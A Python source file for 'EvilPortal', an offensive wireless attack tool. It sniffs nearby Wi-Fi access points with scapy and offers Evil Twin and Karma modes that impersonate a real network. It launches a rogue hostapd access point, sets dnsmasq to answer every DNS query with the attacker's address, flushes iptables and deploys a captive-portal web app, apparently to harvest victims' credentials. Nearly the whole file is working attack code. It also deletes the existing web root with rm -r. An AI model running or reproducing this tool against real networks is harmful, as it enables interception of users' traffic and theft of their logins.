import os, re, time, signal, threading
from scapy.all import *

tempFolder = '/tmp/evilportal'

def title():
    ret = '\n'
    ret += '███████╗██╗   ██╗██╗██╗     ██████╗  ██████╗ ██████╗ ████████╗ █████╗ ██╗     \n'
    ret += '██╔════╝██║   ██║██║██║     ██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗██║     \n'
    ret += '█████╗  ██║   ██║██║██║     ██████╔╝██║   ██║██████╔╝   ██║   ███████║██║     \n'
    ret += '██╔══╝  ╚██╗ ██╔╝██║██║     ██╔═══╝ ██║   ██║██╔══██╗   ██║   ██╔══██║██║     \n'
    ret += '███████╗ ╚████╔╝ ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   ██║  ██║███████╗\n'
    ret += '╚══════╝  ╚═══╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝\n'
    ret += '                                                       By: hacefresko         \n'

    return ret

class networkInterfaces:

    # Here we find directories representing current network interfaces named after them
    netIntDir = '/sys/class/net'

    dnsmasqLogFile = 'dnsmasq.log'
    hostapdLogFile = 'hostapd.log'

    def __init__(self):
        self.interfaces = []

        for dirpath, interfaces, filenames in os.walk(self.netIntDir):
            for interface in interfaces:
                if re.match(r'wlan\d', interface):
                    # Directory /sys/class/net/<interface>/type contains 
                    # the mode in which the interface is operating:
                    #   1   -> managed
                    #   803 -> monitor
                    #
                    f = open(self.netIntDir + '/' + interface + '/type', 'r')
                    if f.read() == '803\n':
                        self.interfaces.append({'name' : interface, 'mode' : 'monitor', 'channel' : 0})
                    else:
                        self.interfaces.append({'name' : interface, 'mode' : 'managed', 'channel' : 0})
                    f.close()

    def __repr__(self):
        ret = '\nNETWORK INTERFACES\n\n'

        i = 1
        for interface in self.interfaces:
            if interface['mode'] == 'monitor':
                ret += '[{}] -> {} ({})\n'.format(i, interface['name'], interface['mode'])
            else:
                ret += '[{}] -> {}\n'.format(i, interface['name'])
            i = i + 1
            
        return ret

    def putInMonitor(self, nInterface):
        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        interface = self.interfaces[nInterface]

        if interface['mode'] == 'monitor':
            print('[x] Selected interface is already in monitor mode!\n')
            return -1
        
        print('[-] Configuring network interface...')

        os.system('ifconfig ' + interface['name'] + ' down')
        os.system('iw ' + interface['name'] + ' set type monitor')
        os.system('ifconfig ' + interface['name'] + ' up')

        # Check if interface is indeed in monitor mode
        f = open(self.netIntDir + '/' + interface['name'] + '/type', 'r')
        if f.read() != '803\n':
            print('[x] Newtork interface couldn\'t be put in monitor mode!\n')
            f.close()
            return -1
        f.close()

        # Set channel to 1 for later scanning
        os.system('iw ' + interface['name'] + ' set channel 1')
        self.interfaces[nInterface]['channel'] = 1

        print('[+] Network interface configured succesfuly')
        
        return 0

    def changeChannel(self, nInterface):
        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        t = threading.currentThread()
        # We assign stop=False as an attribute of the current thread. This is used to stop the loop from other thread
        while not getattr(t, 'stop', False):
            channel = self.interfaces[nInterface]['channel']
            channel = channel + 1
            if channel > 13:
                channel = 1
            self.interfaces[nInterface]['channel'] = channel

            os.system('iw ' + self.interfaces[nInterface]['name'] + ' set channel ' + str(channel))
            time.sleep(0.5)

        os.system('iw ' + self.interfaces[nInterface]['name'] + ' set channel 1')
        self.interfaces[nInterface]['channel'] = 1

    def launchHostapd(self, nInterface, ssid, channel, encryption):
        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        interface = self.interfaces[nInterface]['name']
        
        # Hostapd configuration
        print('[-] Configuring hostapd...')
        hostapdConfigFile = 'hostapd.conf'
        hostapdConfig = ''

        hostapdConfig += 'interface=' + interface + '\n'        # Interface used
        hostapdConfig += 'driver=nl80211\n'                     # Driver interface typr
        hostapdConfig += 'ssid=' + ssid + '\n'                  # SSID
        hostapdConfig += 'hw_mode=g\n'                          # Hardware mode (802.11g)
        hostapdConfig += 'channel=' + channel + '\n'            # Channel
        hostapdConfig += 'macaddr_acl=0\n'                      # Station MAC address -based auth (0 = accept unless in deny list)
        hostapdConfig += 'ignore_broadcast_ssid=0\n'            # Require stations to know SSID to connect (ignore probe requests without full SSID)

        if encryption == 'OPN':
            hostapdConfig += 'auth_algs=1\n'                    # Authenticatin algorithm (bit 0 = Open System Auth)

        elif encryption == 'WPA/PSK':
            password = input('\nWifi password [more than 8 chars]> ')
            print()

            hostapdConfig += 'wpa=1\n'                          # Enable WPA
            hostapdConfig += 'wpa_passphrase=' + password + '\n'# WPA pre-shared key (WiFi password)
            hostapdConfig += 'wpa_key_mgmt=WPA-PSK\n'           # Accepted key management algorithms
            hostapdConfig += 'wpa_pairwise=TKIP CCMP\n'         # Pairwsie cipher for WPA (Temporal Key Integrity Protocl) 
            hostapdConfig += 'auth_algs=3\n'                    # Authenticatin algorithm (bit 2 = Shared Key Auth)

        elif encryption == 'WPA2/PSK':
            password = input('\nWifi password [more than 8 chars]> ')
            print()

            hostapdConfig += 'wpa=2\n'                          # Enable WPA2
            hostapdConfig += 'wpa_passphrase=' + password + '\n'# WPA pre-shared key (WiFi password)
            hostapdConfig += 'wpa_key_mgmt=WPA-PSK\n'           # Accepted key management algorithms
            hostapdConfig += 'wpa_pairwise=TKIP\n'              # Pairwsie cipher for WPA (Temporal Key Integrity Protocl) 
            hostapdConfig += 'rsn_pairwise=CCMP\n'              # Pairwise cipher for RSN/WPA2 (AES-CBC)
            hostapdConfig += 'auth_algs=3\n'                    # Authenticatin algorithm (bit 2 = Shared Key Auth)

        f = open(os.path.join(tempFolder, hostapdConfigFile), 'w')
        f.write(hostapdConfig)
        f.close()

        # Hostapd initialization
        os.system('hostapd ' + os.path.join(tempFolder, hostapdConfigFile) + ' > ' + os.path.join(tempFolder, self.hostapdLogFile) + ' &')
        print('[+] hostapd succesfuly configured')
        
        return 0

    def launchDnsmasq(self, nInterface):
        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        interface = self.interfaces[nInterface]['name']

        # Stop dnsmasq daemon in case it's active
        os.system('service dnsmasq stop')

        # Config dnsmasq
        dnsmasqHostsFile = 'hosts'
        dnsmasqConfigFile = 'dnsmasq.conf'
        dnsmasqConfig = ''

        print('[-] Configuring dnsmasq...')

        dnsmasqConfig += 'interface=' + interface + '\n'                        # Interface in which dnsmasq listen
        dnsmasqConfig += 'dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h\n'  # Range of IPs to set to clients for the DHCP server
        dnsmasqConfig += 'dhcp-option=3,10.0.0.1\n'                             # Set router to 10.0.0.1
        dnsmasqConfig += 'dhcp-option=6,10.0.0.1\n'                             # Set dns server to 10.0.0.1
        dnsmasqConfig += 'log-queries\n'                                        # Log all queries
        dnsmasqConfig += 'address=/#/10.0.0.1\n'                                # Response to every DNS query with 10.0.0.1 (where our captive portal is)

        f = open(os.path.join(tempFolder, dnsmasqConfigFile), 'w')
        f.write(dnsmasqConfig)
        f.close

        # Configures dnsmasq to assign the interface ip to the domain name so 
        # mod_rewrite  from .htaccess can reffer directly to the domain name in the URL
        f = open(os.path.join(tempFolder, dnsmasqHostsFile), 'w')
        f.write('10.0.0.1 wifiportal2.aire.es')
        f.close()

        # Set inet address of interface to 10.0.0.1
        os.system('ifconfig ' + interface + ' 10.0.0.1')

        # Initialize dnsmasq
        os.system('dnsmasq -C ' + os.path.join(tempFolder, dnsmasqConfigFile) + ' -H ' + os.path.join(tempFolder, dnsmasqHostsFile) + ' --log-facility=' + os.path.join(tempFolder, self.dnsmasqLogFile))

        print('[+] dnsmasq succesfuly configured')

        return 0

    def sniffAccessPoints(self, nInterface, sigint_handler):
        accessPoints = []

        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1

        # stop is defined as global for the sigint handler to be able to get it
        global stop
        stop = False

        def sigint_handler_probe(sig, frame):
            global stop
            stop = True
            signal.signal(signal.SIGINT, sigint_handler)
        
        signal.signal(signal.SIGINT, sigint_handler_probe)

        changeChThread = threading.Thread(target = self.changeChannel, args = (nInterface,))
        changeChThread.start()

        print('WIFI ACCESS POINTS (Ctrl C to stop)')
        print('+---+-------------------+----------+----+----------------------------------+')
        print('| i |       BSSID       | ENCRYPTN | CH |               SSID               |')
        print('+---+-------------------+----------+----+----------------------------------+')

        def sniffAP_callback(pkt):
            # Protocol 802.11, type management, subtype beacon
            if pkt.haslayer(Dot11) and pkt[Dot11].type == 0 and pkt[Dot11].subtype == 8:
                # Address 2 is source address (in this case dest is broadcast FF:FF:FF:FF:FF:FF)
                # upper() prints all letters to capital letters
                bssid = pkt[Dot11].addr2.upper()
                ssid = pkt.info.decode('UTF-8')
                channel = pkt[Dot11Beacon].network_stats().get('channel')
                encryption = pkt[Dot11Beacon].network_stats().get('crypto').pop()
                
                newAccessPoint = {'bssid' : bssid, 'ssid' : ssid, 'channel' : str(channel), 'encryption' : encryption}
                if ssid and newAccessPoint not in accessPoints:
                    accessPoints.append(newAccessPoint)
                    print('|%3s| %17s | %8s | %2s | %-32.32s |' % (str(len(accessPoints)), bssid, encryption, channel, ssid))       

        sniffer = AsyncSniffer(iface=self.interfaces[nInterface]['name'], prn=sniffAP_callback)
        sniffer.start()

        while not stop:
            pass

        print('--+-------------------+----------+----+----------------------------------+')
        changeChThread.stop = True
        sniffer.stop()

        accessPoint = -1
        while accessPoint < 0 or accessPoint >= len(accessPoints):
            accessPoint = int(input('Select access point to mirror > ')) - 1

            if accessPoint < 0 or accessPoint >= len(accessPoints):
                print('[x] Input out of bounds!')
            else:
                return accessPoints[accessPoint]
        print('\n')

    def sniffProbeReq(self, nInterface, sigint_handler):
        probeRequests = []

        if type(nInterface) is not int:
            print('[x] Input value is not an integer!\n')
            return -1

        if nInterface < 0 or nInterface >= len(self.interfaces):
            print('[x] Input value out of bounds!\n')
            return -1


        '''
        # We need to create the file before reading it, as tcpdump
        # may delay a few miliseconds until it creates it it self
        f = open(os.path.join(tempFolder, tcpdumpLogFile), 'w+')
        f.close()

        os.system('tcpdump -l -e -i' + self.interfaces[nInterface]['name'] + ' type mgt subtype probe-req>' + os.path.join(tempFolder, tcpdumpLogFile) + ' 2>&1 &')

        tcpdumpFD = open(os.path.join(tempFolder, tcpdumpLogFile), 'r')

        # stop is defined as global for the sigint handler to be able to get it
        global stop
        stop = False

        # Define new sigint handler to be able to stop the scanning loop
        def sigint_handler_probe(sig, frame):
            global stop
            stop = True
            signal.signal(signal.SIGINT, sigint_handler)
        
        signal.signal(signal.SIGINT, sigint_handler_probe)

        t = threading.Thread(target = self.changeChannel, args = (nInterface,))
        t.start()

        print('PROBE REQUESTS (Ctrl C to stop)')
        while not stop:
            line = tcpdumpFD.readline()
            if line:
                client = re.search(r'([0-9a-f]{2}:){5}[0-9a-f]{2}', line)
                ap = re.findall(r'[(](.+?)[)]', line)
                freq = re.findall(r'\d+ MHz', line)
                if client and len(ap) == 2:
                    newProbeRequest = {'client' : client.group(), 'ap' : ap[1]}
                    try:
                        probeRequests.index(newProbeRequest)
                        inList = True
                    except ValueError:
                        inList = False
                    
                    if not inList:
                        probeRequests.append(newProbeRequest)
                        print('[' + str(len(probeRequests)) + '] ' + client.group() + ' -> ' + ap[1] + ' [' + freq[0] + ']')

            time.sleep(0.1)
        
        tcpdumpFD.close()
        os.system('pkill tcpdump')
        t.stop = True
        print()
        '''
        
        probeRequest = -1
        while probeRequest < 0 or probeRequest >= len(probeRequests):
            probeRequest = int(input('Select probe request to mirror > ')) - 1

            if probeRequest < 0 or probeRequest >= len(probeRequests):
                print('[x] Input out of bounds!')
            else:
                return probeRequests[probeRequest]

def configWebApp():
    # Config captive portal files
    print('[-] Copying web files...')
    os.system('rm -r /var/www/html/* 2>/dev/null')
    os.system('cp -r captive /var/www/html/captive')
    os.system('cp .htaccess /var/www/html')
    os.system('chmod 755 /var/www/html/.htaccess')
    os.system('chmod 755 /var/www/html/captive')
    os.system('chmod 755 /var/www/html/captive/*')
    print('[+] Web files copied succesfuly')

    # Enable rewrite and override for .htaccess and php
    print('[-] Configuring apache2...\n')
    os.system('cp -f override.conf /etc/apache2/conf-available/')
    os.system('a2enconf override')
    os.system('a2enmod rewrite')
    os.system('a2enmod php7.3')

    # Reload/restart apache2 and start mysql (mariaDB)
    os.system('service apache2 reload')
    os.system('service apache2 restart')
    print('\n[+] apache2 configured succesfuly')
    print('[-] Configuring mysql...')
    os.system('service mysql start')
    print('[+] mysql configured succesfuly')

# We define the file descriptors for hostapd log file and dnsmasq log file
# as global in order for the sigint handler to be able to get them
hostapdFD = 0
dnsmasqFD = 0
def sigint_handler(sig, frame):
    print('\n[x] SIGINT: Exiting...')
    os.system('pkill hostapd')
    os.system('pkill dnsmasq')

    os.system('rm -r ' + tempFolder + ' 2>/dev/null')

    global hostapdFD
    global dnsmasqFD

    if hostapdFD != 0:
        hostapdFD.close()

    if dnsmasqFD != 0:
        dnsmasqFD.close()

    quit()

signal.signal(signal.SIGINT, sigint_handler)

print(title())

# Check for root priviledges
if os.getuid() != 0:
    print('[x] Please, run program as root!\n')
    quit()

networkInterfaces = networkInterfaces()

# Select network interface
if len(networkInterfaces.interfaces) == 0:
    print('[x] No network interface detected!\n')
    quit()

elif len(networkInterfaces.interfaces) == 1:
    if networkInterfaces.interfaces[0]['mode'] != 'monitor':
        if networkInterfaces.putInMonitor(0) != 0:
            quit()
    interface = 0

elif len(networkInterfaces.interfaces) > 1:
    ok = -1
    while ok != 0: 
        print(networkInterfaces)
        interface = int(input('Select network interface > ')) - 1
        print()
        if interface < 0 or interface >= len(networkInterfaces.interfaces): 
            print('[x] Input value out of bounds!')
        else:
            if networkInterfaces.interfaces[interface]['mode'] != 'monitor':
                ok = networkInterfaces.putInMonitor(interface)
            else:
                ok = 0

print('[+] Network Interface in use: ' + networkInterfaces.interfaces[interface]['name'])

# Create temp folder
try:
    os.makedirs(tempFolder)
except OSError:
    print('[-] Temporal directory ' + tempFolder + ' already exists')

# Flush iptables to avoid conflicts
print ('[-] Flushing iptables...')
os.system('iptables -F')
os.system('iptables -t nat -F')
print('[+] Iptables flushed')

# Select operation mode
op = -1
while op < 1 or op > 3:
    print('\nOPERATION MODE')
    print('[1] -> Create new acces point')
    print('[2] -> [Evil Twin] Intercept existing access point')
    print('[3] -> [Karma] Create acces point recogniced by victim')
    op = int(input('Select operation mode > '))
    print()

    if op == 1:
        ssid = input('WiFi SSID > ')
        channel = input('Channel > ')

        encr = -1
        print('\nSecurity:')
        while encr < 1 or encr > 2:
            print('[1] -> Open')
            print('[2] -> WPA2')
            encr = int(input(' > '))
            if encr < 1 or encr > 2:
                print('[x] Input value out of bounds!\n')
            elif encr == 1:
                encryption = "OPN"
            elif encr == 2:
                encryption = "WPA2/PSK"
        print()

        # Launch hostapd
        networkInterfaces.launchHostapd(interface, ssid, channel, encryption)

        # Launch dnsmasq
        networkInterfaces.launchDnsmasq(interface)

        # Config web app
        configWebApp()

    elif op == 2:
        accessPoint = networkInterfaces.sniffAccessPoints(interface, sigint_handler)
        
        ssid = accessPoint['ssid']
        channel = accessPoint['channel']
        encryption = accessPoint['encryption']

        # Launch hostapd
        networkInterfaces.launchHostapd(interface, ssid, channel, encryption)

        # Launch dnsmasq
        networkInterfaces.launchDnsmasq(interface)

        # Config web app
        configWebApp()

    elif op == 3:
        probeRequest = networkInterfaces.sniffProbeReq(interface, sigint_handler)
        ssid = probeRequest['ap']
        channel = input('Channel > ')

        encr = -1
        print('\nSecurity:')
        while encr < 1 or encr > 2:
            print('[1] -> Open')
            print('[2] -> WPA2')
            encr = int(input(' > '))
            if encr < 1 or encr > 2:
                print('[x] Input value out of bounds!\n')
            elif encr == 1:
                encryption = "OPN"
            elif encr == 2:
                encryption = "WPA2/PSK"
        print()

        # Launch hostapd
        networkInterfaces.launchHostapd(interface, ssid, channel, encryption)

        # Launch dnsmasq
        networkInterfaces.launchDnsmasq(interface)

        # Config web app
        configWebApp()

    else:
        print('[x] Input value out of bounds!\n')

# Print hostapd + dnsmasq
hostapdFD = open(os.path.join(tempFolder, networkInterfaces.hostapdLogFile), 'r')
dnsmasqFD = open(os.path.join(tempFolder, networkInterfaces.dnsmasqLogFile), 'r')
prev = ''
while True:
    hostapdLog = hostapdFD.read()
    if hostapdLog:
        if prev != 'hostapd':
            print('\n[HOSTAPD]')
        print(hostapdLog, end = '')
        prev = 'hostapd'

    dnsmasqLog = dnsmasqFD.read()
    if dnsmasqLog:
        if prev != 'dnsmasq':
            print('\n[DNSMASQ]')
        print(dnsmasqLog, end = '')
        prev = 'dnsmasq'

    time.sleep(1)

